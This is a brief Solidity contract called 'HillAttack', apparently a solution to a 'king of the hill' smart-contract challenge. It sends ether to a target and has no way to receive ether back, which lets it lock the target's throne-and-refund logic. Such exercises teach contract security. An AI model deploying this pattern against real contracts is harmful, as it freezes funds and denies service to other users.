// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract HillAttack {

  function attack(address _target) public payable {
    (bool result,) = _target.call{value:msg.value}("");
    if(!result) revert();
  }

}